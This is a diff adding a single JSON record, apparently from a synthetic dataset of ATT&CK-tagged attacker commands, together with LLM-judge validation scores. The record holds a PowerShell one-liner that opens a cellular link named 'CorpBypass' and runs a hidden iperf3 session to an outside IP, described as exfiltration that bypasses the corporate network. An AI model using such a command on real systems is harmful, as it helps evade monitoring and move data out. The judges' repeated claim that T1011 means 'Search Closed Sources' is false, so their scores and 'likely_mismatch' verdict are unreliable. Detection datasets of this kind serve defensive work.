@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh mbn connect interface=\"Cellular\" connmode=name name=\"CorpBypass\" | Out-Null; $cell=Get-NetAdapter -InterfaceAlias 'Cellular' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $cell.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-c 100.72.55.9 -p 53433 -B $ip -t 60\"",
+  "explanation": "Establishes a mobile broadband session and binds iperf3 to the Cellular interface, exfiltrating via cellular data instead of enterprise LAN (T1011).",
+  "rationale_steps": [
+    "Initiate a mobile broadband connection to enable the cellular medium.",
+    "Resolve the cellular interface IP address.",
+    "Bind iperf3 to that IP on an uncommon port for data egress.",
+    "Execute hidden to reduce casual observation."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-f87300ae",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes, valid parameter names, proper error handling with ErrorAction, and correct command separators.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does establish a cellular connection outside the corporate network, it doesn't align with T1011 (Search Closed Sources) but rather with T1048 (Exfiltration Over Alternative Protocol) or T1572 (Protocol Tunneling).",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T12:49:43.161386Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced quotes, proper separators, and valid flag usage for all included commands.",
+        "semantic_score": 1,
+        "semantic_justification": "While the command plausibly sets up a cellular bypass for outbound traffic, its described function of 'exfiltrating' data is fundamentally misaligned with MITRE ATT&CK T1011 (Search Closed Sources), which pertains to 'acquiring or querying non-public information' for intelligence gathering.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T12:50:12.710581Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell one-liner uses valid cmdlets and parameters with balanced quotes/parentheses and proper separators, and arguments to netsh and Start-Process are correctly formed.",
+        "semantic_score": 1,
+        "semantic_justification": "While it initiates a cellular connection and binds iperf3 to that interface, it performs exfiltration-style traffic rather than any activity related to 'Search Closed Sources' as described for T1011.",
+        "combined_score": 3.0,
+        "confidence": 0.84,
+        "timestamp": "2025-10-02T12:50:38.327421Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
